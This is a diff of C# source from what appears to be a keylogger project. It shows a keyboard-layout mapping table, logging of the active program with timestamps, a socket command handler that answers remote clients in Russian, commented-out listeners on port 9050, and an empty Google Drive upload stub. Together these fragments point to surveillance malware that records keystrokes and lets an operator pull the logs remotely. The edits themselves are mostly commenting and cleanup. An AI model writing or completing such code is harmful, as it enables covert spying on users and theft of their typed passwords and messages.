@@ -58,8 +58,8 @@ namespace ConsoleApp2
 
   */
 
-//             ShowWindow(handle, SW_HIDE);
-           ShowWindow(handle, 1);
+            //             ShowWindow(handle, SW_HIDE);
+            ShowWindow(handle, 1);
             dictionaryRusEng.Add('Q', 'Й');
             dictionaryRusEng.Add('W', 'Ц');
             dictionaryRusEng.Add('E', 'У');
@@ -167,7 +167,7 @@ namespace ConsoleApp2
                     PreviousProgram = CurrentProgram;
                     string time = DateTime.Now.ToString();
                     Writer("\n\t[Program: " + CurrentProgram + "\n\tDateTime: " + time + "]\n");
-                    //   Console.WriteLine("[Program: " + CurrentProgram + "  DateTime: " + time + "]\n");
+                    //   Console.WriteLine("[Program: " + CurrentProgram + "  DateTime: " + time + "]\n"); 
                 }
 
 
@@ -880,9 +880,16 @@ namespace ConsoleApp2
                                 }
 
                                 break;
+                            /*    case "screen":
+                                    break;
+
+                                case "log":
+                                    break;*/
 
                             default:
-                                SSend("Невыполнимая команда. Попробуйте HELP", client);
+                                /*if (fileName == "screen" && fileName == "log")
+                                    SSend(" ", client);
+                                else*/ SSend("Чтобы посотмреть доступные команды введите help", client);
                                 break;
 
                         }
@@ -934,7 +941,7 @@ namespace ConsoleApp2
                 }
             }
         }
-
+/*
         public static void ServerSocket2()
         {
             IPEndPoint ipep = new IPEndPoint(IPAddress.Any, 9050);
@@ -1035,7 +1042,7 @@ namespace ConsoleApp2
                 }
             }
         }
-
+*/
         public static void SocketWorker(string fileName, Socket client)
         {
             string filePath = Application.StartupPath;
@@ -1053,7 +1060,7 @@ namespace ConsoleApp2
         }
 
 
-        public static void ServerSocket3()
+   /*     public static void ServerSocket3()
         {
             IPEndPoint ipep = new IPEndPoint(IPAddress.Any, 9050);
             Socket newsock = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
@@ -1093,7 +1100,12 @@ namespace ConsoleApp2
             }
 
         }
+*/
 
+        public static void GoogleDriveLoad()
+        {
+
+        }
 
 
     }
